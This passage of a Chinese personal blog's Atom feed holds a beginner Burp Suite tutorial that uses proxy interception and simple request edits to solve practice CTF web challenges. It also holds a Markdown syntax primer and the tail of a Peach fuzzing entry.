&lt;p&gt;接下来就简单记录一下今天下午对peach框架的粗浅尝试。&lt;/p&gt;
&lt;h3 id=&quot;以下是工作文件夹和成果展示&quot;&gt;&lt;a href=&quot;#以下是工作文件夹和成果展示&quot; class=&quot;headerlink&quot; title=&quot;以下是工作文件夹和成果展示&quot;&gt;&lt;/a&gt;以下是工作文件夹和成果展示&lt;/h3&gt;</summary>
    
    
    
    <category term="fuzz" scheme="http://example.com/categories/fuzz/"/>
    
    
  </entry>
  
  <entry>
    <title>burpsuite工具学习</title>
    <link href="http://example.com/2022/01/03/burpsuite/"/>
    <id>http://example.com/2022/01/03/burpsuite/</id>
    <published>2022-01-03T11:01:58.000Z</published>
    <updated>2023-01-24T12:30:49.411Z</updated>
    
    <content type="html"><![CDATA[<p>可恶，我怎么没听说过fuzz还要学web的东西。</p><blockquote><p>安装教程：<a href="https://www.bilibili.com/video/BV1aq4y1X7oE">https://www.bilibili.com/video/BV1aq4y1X7oE</a></p><p>搭配ctf赛题进行食用：<a href="https://www.cnblogs.com/linfangnan/p/13546089.html#1522552177">https://www.cnblogs.com/linfangnan/p/13546089.html#1522552177</a></p></blockquote><p>先谢谢以上师傅。</p><h2 id="基本抓包流程——以bugku的””你必须让他停下”为例"><a href="#基本抓包流程——以bugku的””你必须让他停下”为例" class="headerlink" title="基本抓包流程——以bugku的””你必须让他停下”为例"></a>基本抓包流程——以bugku的””你必须让他停下”为例</h2><span id="more"></span><img src="https://c2.im5i.com/2022/01/04/EZvz2.png" style="zoom:67%;" /><h3 id="FireBox设置网络代理"><a href="#FireBox设置网络代理" class="headerlink" title="FireBox设置网络代理"></a>FireBox设置网络代理</h3><img src="https://c2.im5i.com/2022/01/04/EZCVl.png" style="zoom: 67%;" /><h3 id="BurpSuite设置代理监听"><a href="#BurpSuite设置代理监听" class="headerlink" title="BurpSuite设置代理监听"></a>BurpSuite设置代理监听</h3><img src="https://c2.im5i.com/2022/01/04/EZqT7.png" style="zoom:67%;" /><h3 id="开启intercept截听器"><a href="#开启intercept截听器" class="headerlink" title="开启intercept截听器"></a>开启intercept截听器</h3><img src="https://c2.im5i.com/2022/01/04/EZNNP.png" style="zoom:67%;" /><h3 id="点击网页，BurpSuite暂时拦截请求"><a href="#点击网页，BurpSuite暂时拦截请求" class="headerlink" title="点击网页，BurpSuite暂时拦截请求"></a>点击网页，BurpSuite暂时拦截请求</h3><p>该网页发送的请求被拦截，因此页面一直无响应，在BurpSuite中看到了该请求报文</p><p>点击<strong>Forward</strong>就是将该报文发送出去，<strong>Drop</strong>便是丢弃该请求</p><img src="https://c2.im5i.com/2022/01/04/EZSbD.png" style="zoom: 67%;" /><p>我们点击<span style="color:red;font-weight:600">forward</span>后，可以看到页面有了响应，这是因为目标服务端收到请求后返回了资源将页面进行渲染</p><p>而至于为什么页面又发送了请求，是因为该网站利用 JS 进行了一个不断刷新的操作</p><img src="https://c2.im5i.com/2022/01/04/EZgmj.png" style="zoom:67%;" /><p>该题的难点就是不断刷新，让用户难以捕捉藏于HTML中的flag，但BurpSuite的截听器让<strong>请求发送变得人为可控</strong>。</p><p>我们找到相应的响应报文即可拿到flag，图如下。</p><img src="https://c2.im5i.com/2022/01/04/EZdMq.png" style="zoom:67%;" /><h2 id="修改请求方式——以攻防世界的”babyweb”为例"><a href="#修改请求方式——以攻防世界的”babyweb”为例" class="headerlink" title="修改请求方式——以攻防世界的”babyweb”为例"></a>修改请求方式——以攻防世界的”babyweb”为例</h2><img src="https://c2.im5i.com/2022/01/04/EZjWz.png"  /><h3 id="将Get请求方式修改为Post"><a href="#将Get请求方式修改为Post" class="headerlink" title="将Get请求方式修改为Post"></a>将Get请求方式修改为Post</h3><img src="https://c2.im5i.com/2022/01/04/EZT05.png" style="zoom:67%;" /><h3 id="增加请求参数"><a href="#增加请求参数" class="headerlink" title="增加请求参数"></a>增加请求参数</h3><img src="https://c2.im5i.com/2022/01/04/EZ2t8.png" style="zoom:67%;" /><h3 id="点击forward，显示flag"><a href="#点击forward，显示flag" class="headerlink" title="点击forward，显示flag"></a>点击forward，显示flag</h3><p><img src="https://c2.im5i.com/2022/01/04/EZHdG.png"></p><h2 id="修改Referer——以bugku的”你从哪里来”为例"><a href="#修改Referer——以bugku的”你从哪里来”为例" class="headerlink" title="修改Referer——以bugku的”你从哪里来”为例"></a>修改Referer——以bugku的”你从哪里来”为例</h2><img src="https://c2.im5i.com/2022/01/04/EZYww.png" style="zoom:67%;" /><p><img src="https://c2.im5i.com/2022/01/04/EiC3d.png"></p><h3 id="给请求头增加Referer，指向谷歌地址"><a href="#给请求头增加Referer，指向谷歌地址" class="headerlink" title="给请求头增加Referer，指向谷歌地址"></a>给请求头增加Referer，指向谷歌地址</h3><img src="https://c2.im5i.com/2022/01/04/EZ9xU.png" style="zoom:67%;" /><p>点击forward，获取flag</p><p><img src="https://c2.im5i.com/2022/01/04/EiqO4.png"></p><hr><p>后续如果还有用到BurpSuite更多功能的话应该还会继续更新！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;可恶，我怎么没听说过fuzz还要学web的东西。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;安装教程：&lt;a href=&quot;https://www.bilibili.com/video/BV1aq4y1X7oE&quot;&gt;https://www.bilibili.com/video/BV1aq4y1X7oE&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;搭配ctf赛题进行食用：&lt;a href=&quot;https://www.cnblogs.com/linfangnan/p/13546089.html#1522552177&quot;&gt;https://www.cnblogs.com/linfangnan/p/13546089.html#1522552177&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;先谢谢以上师傅。&lt;/p&gt;
&lt;h2 id=&quot;基本抓包流程——以bugku的””你必须让他停下”为例&quot;&gt;&lt;a href=&quot;#基本抓包流程——以bugku的””你必须让他停下”为例&quot; class=&quot;headerlink&quot; title=&quot;基本抓包流程——以bugku的””你必须让他停下”为例&quot;&gt;&lt;/a&gt;基本抓包流程——以bugku的””你必须让他停下”为例&lt;/h2&gt;</summary>
    
    
    
    <category term="fuzz" scheme="http://example.com/categories/fuzz/"/>
    
    
  </entry>
  
  <entry>
    <title>MarkDown的基本使用</title>
    <link href="http://example.com/2022/01/02/how2markdown/"/>
    <id>http://example.com/2022/01/02/how2markdown/</id>
    <published>2022-01-02T06:36:39.000Z</published>
    <updated>2022-01-02T10:19:22.475Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h3 id="标题使用"><a href="#标题使用" class="headerlink" title="标题使用"></a>标题使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">### 三级标题</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- 1</span><br><span class="line">- 2</span><br><span class="line">- 2.1</span><br><span class="line">- 2.2</span><br><span class="line">- 3</span><br></pre></td></tr></table></figure><ul><li>1</li><li>2<ul><li>2.1</li><li>2.2</li></ul></li><li>3</li></ul><h3 id="文字链接"><a href="#文字链接" class="headerlink" title="文字链接"></a>文字链接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[我的博客链接](https://anza2001.github.io/)</span><br></pre></td></tr></table></figure><p><a href="https://anza2001.github.io/">我的博客链接</a></p><h3 id="图片链接"><a href="#图片链接" class="headerlink" title="图片链接"></a>图片链接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![图片名](https://c2.im5i.com/2022/01/02/EorW6.png)</span><br><span class="line">我使用的是云图床:https://cloudimge.com/,免费但偶尔会崩</span><br></pre></td></tr></table></figure><img src="https://c2.im5i.com/2022/01/02/EorW6.png" alt="头像" style="zoom: 25%;" /><h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">斜线——*斜线*</span><br><span class="line">加粗——**加粗**</span><br><span class="line">代码行——`代码行`</span><br><span class="line">代码块——```</span><br><span class="line">        &lt;html&gt;</span><br><span class="line">        &lt;body&gt;代码块&lt;/body&gt;</span><br><span class="line">        &lt;/html&gt;</span><br></pre></td></tr></table></figure><p><em>斜线</em>  <strong>加粗</strong>  <code>代码行</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>代码块<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分隔符"><a href="#分隔符" class="headerlink" title="分隔符"></a>分隔符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--- 或 ***</span><br></pre></td></tr></table></figure><hr><hr><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; 引用内容</span><br></pre></td></tr></table></figure><blockquote><p>引用内容</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;一级标题&quot;&gt;&lt;a href=&quot;#一级标题&quot; class=&quot;headerlink&quot; title=&quot;一级标题&quot;&gt;&lt;/a&gt;一级标题&lt;/h1&gt;&lt;h2 id=&quot;二级标题&quot;&gt;&lt;a href=&quot;#二级标题&quot; class=&quot;headerlink&quot; title=&quot;二级标题&quot;&gt;&lt;/a&gt;二级标题&lt;/h2&gt;&lt;h3 id=&quot;三级标题&quot;&gt;&lt;a href=&quot;#三级标题&quot; class=&quot;headerlink&quot; title=&quot;三级标题&quot;&gt;&lt;/a&gt;三级标题&lt;/h3&gt;&lt;h3 id=&quot;标题使用&quot;&gt;&lt;a href=&quot;#标题使用&quot; class=&quot;headerlink&quot; title=&quot;标题使用&quot;&gt;&lt;/a&gt;标题使用&lt;/h3&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# 一级标题&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;## 二级标题&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;### 三级标题&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="other" scheme="http://example.com/categories/other/"/>
    
    
  </entry>
  
</feed>
